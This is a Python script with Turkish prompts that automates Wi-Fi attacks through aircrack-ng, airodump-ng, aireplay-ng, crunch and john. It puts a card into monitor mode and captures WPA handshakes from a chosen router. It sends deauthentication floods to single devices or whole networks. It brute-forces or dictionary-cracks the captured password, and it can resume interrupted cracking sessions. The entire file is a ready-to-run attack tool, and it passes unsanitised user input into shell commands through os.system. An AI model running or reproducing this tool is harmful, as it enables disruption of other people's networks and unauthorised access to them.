import os
import time
import re

def kurulum():
    print("Kurulum Başlıyor...")
    time.sleep(3)
    #os.system("apt-get update")
    os.system("sudo apt-get install xterm")
    os.system("sudo apt-get install nikto")
    os.system("sudo apt-get install crunch")
    os.system("sudo apt-get install leafpad")
    os.system("sudo apt-get install john")
    os.system("clear")

def wifi_attack():
    os.system("clear")
    print("-"*40 + " WİFİ PASSWORD TEST TOOL " + "-"*40)
    os.system("sudo airmon-ng")
    print("\n")
    print("Kullanacağınız Ağ Kartı interfacenizi listeden Seçin... ")
    print("-"*80)
    print("Kullanacağınız ağ kartı monitör modda ise ENTER a basın !")
    print("-"*80)
    iface = input("interface: ")
    print("-"*80)
    
    if iface == "":
        mon_iface = input("monitör mod interface: ")
        time.sleep(2)
        os.system(" xterm -geo 120x35 -fa monaco -fs 9 -hold -e sudo airodump-ng " +mon_iface+ " &")

    elif iface != "":
        mon_iface = iface + "mon"
        print(iface + " Ağ kartınız monitör moda alınıyor...")
        os.system(" xterm -geo 120x25 -fa monaco -fs 9 -hold -e sudo airmon-ng start " + iface + "&")
        time.sleep(3)
        os.system(" xterm -geo 120x35 -fa monaco -fs 9 -hold -e sudo airodump-ng " +mon_iface+ " &")
        time.sleep(5)

    def tarama():
        print("-"*80)
        print("SHIFT+INSERT TUŞU İLE MAC ADRESİNİ KOPYALAYABİLİRSİNİZ !\n")
        while True:
            wifi_mod_mac = input("hedef modem mac adresi => ")
            kontrol = re.search("\w\w:\w\w:\w\w:\w\w:\w\w:\w\w" , wifi_mod_mac)
            if kontrol:
                print("-"*80)
                kanal = input("modemin kanal numarası : ")
                print("-"*80) 
                os.system("xterm -geo 120x35 -fa monaco -fs 9 -hold -e airodump-ng --bssid " +wifi_mod_mac+ " --channel " +kanal+ " --write " +wifi_mod_mac+ " " +mon_iface+ " --output-format pcap & ")
                while True:
                    cihaz = input("Deauth Atak Yapılacak Cihaz Varmı...? (y / n): ")
                    print("-"*80)
                    if cihaz == "y":
                        while True:
                            cihaz_mac = input("hedef cihaz mac adresi => ")
                            kontrol = re.search("\w\w:\w\w:\w\w:\w\w:\w\w:\w\w" , cihaz_mac)
                            if kontrol:
                                print("-"*80)
                                deauth = input("deauth paket sayısı: ")
                                print("-"*80)
                                os.system("xterm -fa monaco -fs 9 -hold -e aireplay-ng --deauth " +deauth+ " -a " +wifi_mod_mac+ " -c " +cihaz_mac+ " " +mon_iface+ "&")
                                def menü():
                                    while True:
                                        print("""
                    1 - Aynı Cihaza Tekrar Deauth Saldırısı Yap...
                    2 - Ağdaki Farklı Bir Cihaza Deauth Saldırısı Yap...
                    3 - Ağ Kartının Kanalını Değiştir...
                    4 - Monitör Modu Kapat ve Programdan Çık...
                    5 - Başka Bir Modem Ağını Tara...
                    6 - Kayıt yapmadan Wordlist Oluşturma ve Şifre Kırma...
                    7 - Hazır Wordlist ile şifre kırma """)
                                        print("\n")
                                        soru = input("Yapılacak İşlemi Seçin... : ")

                                        if soru == "1":
                                            print("-"*80)
                                            deauth = input("deauth paket sayısı : ")
                                            print("-"*80)
                                            os.system("xterm -fa monaco -fs 9 -hold -e aireplay-ng --deauth " +deauth+ " -a " +wifi_mod_mac+ " -c " +cihaz_mac+ " " +mon_iface + "&")
                                        elif soru == "2":
                                            os.system("clear")
                                            print("-"*80)
                                            cihaz_mac = input("hedef cihaz mac adresi : ")
                                            print("-"*80)
                                            deauth = input("deauth paket sayısı: ")
                                            os.system("xterm -fa monaco -fs 9 -hold -e aireplay-ng --deauth " +deauth+ " -a " +wifi_mod_mac+ " -c " +cihaz_mac+ " " +mon_iface + "&")
                                        elif soru == "3":
                                            print("-"*80)
                                            kanal = input("Ağ Kartınız Kaçıncı Kanala Alınsın: ")
                                            print("-"*80)
                                            os.system("iwconfig " +mon_iface+ " channel " + kanal)
                                            print("Ağ kartınız " +kanal+ " Kanalına Alındı...")
                                        elif soru == "4":
                                            os.system(" xterm -fa monaco -fs 9 -hold -e sudo airmon-ng stop " + mon_iface + "&" )
                                            os.system("clear")
                                            exit()
                                        elif soru == "5":
                                            os.system("clear")
                                            os.system(" xterm -geo 120x35 -fa monaco -fs 9 -hold -e sudo airodump-ng " +mon_iface+ " &")
                                            tarama()
                                        elif soru == "6":
                                            sifre_kır()
                                        elif soru == "7":
                                            wordlist()
                                        else:
                                            print("Hatalı Giriş...")
                                menü()
                            else:
                                print("MAC ADRESİ YANLIŞ GİRİLDİ !")
                                print("-"*80)
                                continue
                    elif cihaz == "n":
                        os.system(" xterm -geo 120x35 -fa monaco -fs 9 -hold -e sudo airodump-ng " +mon_iface+ " &")
                        break
                    else :
                        print("-"*80)
                        print("Hatalı Giriş...\n")
                        continue
            else:
                print("MAC ADRESİ YANLIŞ GİRİLDİ !")
                print("-"*80)
                continue
    tarama()         

def managed_mod():
    os.system(" xterm -fa monaco -fs 9 -hold -e sudo iwconfig " "&")
    mon_iface = input("monitör mod interface => ")
    os.system(" xterm -fa monaco -fs 9 -hold -e sudo airmon-ng stop " + mon_iface + "&" )

def sifre_kır():
    os.system("clear")
    print("-"*80)
    print("Wordlist Kaydetmeden Wİ-Fİ Parola Kırma Sistemi")
    print("-"*80)
    min_kar = input("minimum karakter sayısı: ")
    print("-"*80)
    max_kar = input("maksimum karakter sayısı: ")
    print("-"*80)
    kul_kar = input("kullanılacak karakterler: ")
    print("-"*80)
    islem_ismi = input("şifre kırma işlemini durdurup devam etmek için bir işlem ismi girin! : ")
    print("-"*80)
    print("Handshake Listesi:\n")
    os.system("ls -l *.cap")
    print("-"*80)
    while True:
        handshake = input("handshake dosya yolunu ve ismini girin! : ")
        print("-"*80)
        if handshake[-4:] == ".cap":
            while True:
                wifi_mod_mac = input("hedef modem mac adresini girin! : ")
                kontrol = re.search("\w\w:\w\w:\w\w:\w\w:\w\w:\w\w" , wifi_mod_mac)
                if kontrol:
                    print("-"*80)
                    while True:
                        print("Özel parola kalıp girişi yapılacakmı ? ")
                        cevap =input("(y / n) ==> ")
                        if cevap == "y":
                            print("-"*80)
                            print("""
                        ! özel parola kalıbı minimum ve maksimum karakter sayısına uygun olmalıdır...

                        ÖRNEK ÖZEL PAROLA KALIBI  ==> [ ali@%^ - %%ali@^ - ali@@%% - ,,ali%@can^ ]

                        ^ ^ : noktalama sembolleri    --> ! @ # $ % ^ & * ( ) - _ + = ~ ` [ ] { } | \ : ; " ' < > , . ? /
                        % % : sayılar                 --> 0 1 2 3 4 5 6 7 8 9
                        @ @ : kullanılan karakterler  --> Giriş Yaptıpınız Karakterler...
                        , , : büyük harf              --> A B C D E F G H I J K L M N O P Q R S T U V W X Y Z """)
                            print("\n")
                            kalıp = input("özel parola kalıbı girişi: ")
                            print("-"*80)
                            crunch = "crunch %s %s %s -t %s"%(min_kar,max_kar,kul_kar,kalıp)
                            file = open(islem_ismi,"w")
                            file.write(crunch)
                            file.close()
                            os.system("sudo xterm -title aircrack -fa monaco -fs 9 -hold -e '%s | john --stdin --session=%s --stdout | aircrack-ng -w - -b %s %s'&"%(crunch,islem_ismi,wifi_mod_mac,handshake))
                            exit()

                        elif cevap == "n":
                            crunch = "crunch %s %s %s"%(min_kar,max_kar,kul_kar)
                            file = open(islem_ismi,"w")
                            file.write(crunch)
                            file.close()
                            os.system("sudo xterm -title aircrack -fa monaco -fs 9 -hold -e '%s | john --stdin --session=%s --stdout | aircrack-ng -w - -b %s %s'&"%(crunch,islem_ismi,wifi_mod_mac,handshake))
                            exit()
                        else:
                            print("Hatalı Giriş... \n")
                            continue
                else:
                    print("MAC ADRESİ YANLIŞ GİRİLDİ !")
                    print("-"*80)
                    continue
        if handshake[-4:] != ".cap":
            print("HATALI GİRİŞ !")
            continue

def wordlist():
    print("Handshake Listesi:\n")
    os.system("ls -l *.cap")
    print("-"*80)
    while True:
        handshake = input("Handshake Dosya Yolu: ")
        print("-"*80)
        if handshake[-4:] == ".cap":
            wordlist = input("Wordlist Dosya yolu: ")
            print("-"*80)
            os.system(" xterm -fa monaco -fs 9 -hold -e sudo aircrack-ng %s -w %s & " %(handshake,wordlist))
            break
        if handshake[-4:] != ".cap":
            print("HATALI GİRİŞ !\n")
            continue

def sifre_devam():
    os.system("clear")
    print("-"*25 + " Durdurulan Wodliste Devam Et ! " + "-"*25)
    print("\n")
    print("Durdurulan Wordlist Kayıt Listesi:\n")
    os.system("ls -l *.rec")
    print("-"*80)
    devam = input("Devam Edecek İşlem İsmini Girin: ")
    print("-"*80)
    print("Handshake Listesi:\n")
    os.system("ls -l *.cap")
    print("-"*80)
    handshake = input("Handshake Dosya Yolunu ve İsmini Girin! : ")
    print("-"*80)
    modem_mac = input("modem mac adresini girin! : ")
    file = open(devam,"r")
    crunch = file.read()
    file.close()
    os.system("sudo xterm -title aircrack -fa monaco -fs 9 -hold -e '%s | john --restore=%s | aircrack-ng -w - -b %s %s'&"%(crunch,devam,modem_mac,handshake))

def deauth_attack():
    os.system("clear")
    print("-"*25 + " YETKİSİZLENDİRME ! " + "-"*25)
    print("\n")
    os.system("sudo airmon-ng")
    print("\n")
    print("Kullanacağınız Ağ Kartı interfacenizi listeden Seçin... ")
    print("\n")
    iface = input("interface: ")
    print("-"*80)
    print(iface + " Ağ kartınız monitör moda alınıyor...")
    os.system(" xterm -geo 120x25 -fa monaco -fs 9 -hold -e sudo airmon-ng start " + iface + "&")
    time.sleep(5)
    print("-"*80)
    mon_iface = input("monitör_mode_interface: ")
    os.system(" xterm -geo 120x35 -fa monaco -fs 9 -hold -e sudo airodump-ng " +mon_iface+ " &")
    print("-"*80)
    while True:
        print("""
        1 - Tek Cihaza Deauth Saldırısı Yap...
        2 - Ağdaki Tüm cihazlara Deauth saldırısı Yap...
        3 - Ağ Kartının Kanalını Değiştir...
        4 - Monitör Modu Kapat ve Programdan Çık...""")
        print("\n")
        soru = input("Yapılacak İşlemi Seçin... : ")
        if soru == "1":
            os.system("clear")
            print("-"*80)
            wifi_mod_mac = input("hedef modem mac adresi : ")
            print("-"*80)
            kanal = input("modemin kanal numarası : ")
            os.system("xterm -geo 120x35 -fa monaco -fs 9 -hold -e airodump-ng --bssid " +wifi_mod_mac+ " --channel " +kanal+ " --write " +wifi_mod_mac+ " " +mon_iface+ " --output-format pcap & ")
            print("-"*80)
            while True:
                cihaz = input("Deauth Atak Yapılacak Cihaz Varmı...? (y / n): ")
                print("-"*80)
                if cihaz == "y":
                    cihaz_mac = input("hedef cihaz mac adresi : ")
                    print("-"*80)
                    deauth = input("deauth paket sayısı : ")
                    print("-"*80)
                    os.system("xterm -fa monaco -fs 9 -hold -e aireplay-ng --deauth " +deauth+ " -a " +wifi_mod_mac+ " -c " +cihaz_mac+ " " +mon_iface + "&")
                    break
                if cihaz == "n":
                    break

        elif soru == "2":
            os.system("clear")
            print("-"*80)
            wifi_mod_mac = input("hedef modem mac adresi : ")
            if len(wifi_mod_mac) != 17:
                print("Hatalı Giriş....")
                continue
            elif len(wifi_mod_mac) == 17:
                print("-"*80)
            kanal = input("modemin kanal numarası : ")
            print("-"*80)
            os.system("xterm -geo 120x35 -fa monaco -fs 9 -hold -e airodump-ng --bssid " +wifi_mod_mac+ " --channel " +kanal+ " --write " +wifi_mod_mac+ " " +mon_iface+ " --output-format pcap & ")
            deauth = input("deauth paket sayısı : ")
            print("-"*80)
            os.system("xterm -fa monaco -fs 9 -hold -e aireplay-ng --deauth " +deauth+ " -a " +wifi_mod_mac+ " " +mon_iface+ "&")
        
        elif soru == "3":
            print("-"*80)
            kanal = input("Ağ Kartınız Kaçıncı Kanala Alınsın: ")
            print("-"*80)
            os.system("iwconfig " +mon_iface+ " channel " + kanal)
            print("Ağ kartınız " +kanal+ " Kanalına Alındı...")
            print("-"*80)

        elif soru == "4":
            os.system(" xterm -fa monaco -fs 9 -hold -e sudo airmon-ng stop " + mon_iface + "&" )
            os.system("clear")
            break



while True:
    os.system("clear")
    print("""
    1 - Gerekli Kurulumları Yap...
    2 - Wifi Ağda Handshake Yakala...
    3 - Wordlist Kaydetmeden Parola Kırma...
    4 - Hazır Wordlist ile Parola Kırma...
    5 - Durdurulan Wordliste Devam Et...
    6 - Yetkisizlendirme Saldırısı...
    7 - Monitör Modu Kapat...
    8 - Çıkış...""")
    print("\n")
    soru = input("Yapılacak İşlemi Seçin... : ")
    print("-"*80)


    if soru == "1":
        kurulum()
    if soru == "2":
        wifi_attack()
    if soru == "3":
        sifre_kır()
    if soru == "4":
        wordlist()
    if soru == "5":
        sifre_devam()
    if soru == "6":
        deauth_attack()
    if soru == "7":
        managed_mod()
    if soru == "8":
        os.system("clear")
        quit()